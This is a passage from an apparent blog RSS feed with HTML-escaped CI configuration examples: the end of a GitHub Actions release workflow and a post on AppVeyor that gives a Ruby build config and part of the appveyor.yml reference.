&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;steps&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;uses&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;actions/checkout@v1&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;find env&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;run&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;|
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;        set | grep GITHUB_ | grep -v GITHUB_TOKEN
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;        zip -r pkg.zip *.md
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;    - uses: xresloader/upload-to-github-release@v1
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;      env:
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;      with:
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;        file: &amp;#34;*.md;*.zip&amp;#34;
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;        tags: true
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;        draft: false
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;        prerelease: true
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;        overwrite: true
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;        verbose: true
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Appveyor</title>
        <link>https://sdttttt.github.io/p/appveyor/</link>
        <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
        
        <guid>https://sdttttt.github.io/p/appveyor/</guid>
        <description>&lt;p&gt;Appveyor ä¹Ÿæ˜¯ä¸€æ¬¾çº¿ä¸Š CICD å·¥å…·ã€‚&lt;/p&gt;
&lt;p&gt;Support Contexts:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Windows (Default)&lt;/li&gt;
&lt;li&gt;Ubuntu&lt;/li&gt;
&lt;li&gt;MacOS&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Support Languages:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Node.js&lt;/li&gt;
&lt;li&gt;io.js&lt;/li&gt;
&lt;li&gt;Xamarin&lt;/li&gt;
&lt;li&gt;Python&lt;/li&gt;
&lt;li&gt;Ruby&lt;/li&gt;
&lt;li&gt;C++&lt;/li&gt;
&lt;li&gt;Go&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;ruby&#34;&gt;Ruby&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-yaml&#34; data-lang=&#34;yaml&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;version&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1.0&lt;/span&gt;&lt;span class=&#34;l&#34;&gt;.{build}-{branch}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;skip_commits&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;files&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;- &lt;span class=&#34;s1&#34;&gt;&amp;#39;azure-pipelines.yml&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;- &lt;span class=&#34;s1&#34;&gt;&amp;#39;README.md&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;install&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;set PATH=C:\Ruby26-x64\bin;%PATH%&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;bundle install&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;build&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;off&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;before_test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;ruby -v&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;gem -v&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;bundle -v&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;test_script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;rails db:migrate RAILS_ENV=test&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;appveyoryml-reference&#34;&gt;Appveyor.yml Reference&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-yml&#34; data-lang=&#34;yml&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# Notes:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#   - Minimal appveyor.yml file is an empty file. All sections are optional.&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#   - Indent each level of configuration with 2 spaces. Do not use tabs!&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#   - All section names are case-sensitive.&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#   - Section names should be unique on each level.&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#---------------------------------#&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#      general configuration      #&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#---------------------------------#&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# version format&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;version&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1.0&lt;/span&gt;&lt;span class=&#34;l&#34;&gt;.{build}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# you can use {branch} name in version format too&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# version: 1.0.{build}-{branch}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# branches to build&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;branches&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# whitelist&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;only&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;master&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;production&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# blacklist&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;except&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;gh-pages&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# Do not build on tags (GitHub, Bitbucket, GitLab, Gitea)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;skip_tags&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# Start builds on tags only (GitHub, BitBucket, GitLab, Gitea)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;skip_non_tags&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# Skipping commits with particular message or from specific user&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;skip_commits&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;message&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;/Created.*\.(png|jpg|jpeg|bmp|gif)/      # Regex for matching commit message&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;author&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;John                                      # Commit author&amp;#39;s username, name, email or regexp maching one of these.&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# Including commits with particular message or from specific user&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;only_commits&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;message&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;/build/                # Start a new build if message contains &amp;#39;build&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;author&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;jack@company.com        # Start a new build for commit of user with email jack@company.com&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# Skipping commits affecting specific files (GitHub only). More details here: /docs/appveyor-yml&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#skip_commits:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#  files:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#    - docs/*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#    - &amp;#39;**/*.html&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# Including commits affecting specific files (GitHub only). More details here: /docs/appveyor-yml&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#only_commits:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#  files:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#    - Project-A/&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#    - Project-B/&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# Do not build feature branch with open Pull Requests&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;skip_branch_with_pr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# Maximum number of concurrent jobs for the project&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;max_jobs&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#---------------------------------#&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#    environment configuration    #&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#---------------------------------#&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# Build worker image (VM template)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;image&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;Visual Studio 2015&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# scripts that are called at very beginning, before repo cloning&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;init&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;git config --global core.autocrlf input&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# clone directory&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;clone_folder&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;c:\projects\myproject&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# fetch repository as zip archive&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;shallow_clone&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;                 &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# default is &amp;#34;false&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# set clone depth&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;clone_depth&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;m&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;                      &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# clone entire repository history if not defined&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# setting up etc\hosts file&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;hosts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;queue-server&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;m&#34;&gt;127.0.0.1&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;db.server.com&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;m&#34;&gt;127.0.0.2&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# environment variables&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;environment&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;my_var1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;value1&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;my_var2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;value2&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# this is how to set encrypted variable. Go to &amp;#34;Settings&amp;#34; -&amp;gt; &amp;#34;Encrypt YAML&amp;#34; page in account menu to encrypt data.&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;my_secure_var1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;secure&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;FW3tJ3fMncxvs58/ifSP7w==&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# environment:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#  global:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#    connection_string: server=12;password=13;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#    service_url: https://127.0.0.1:8090&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
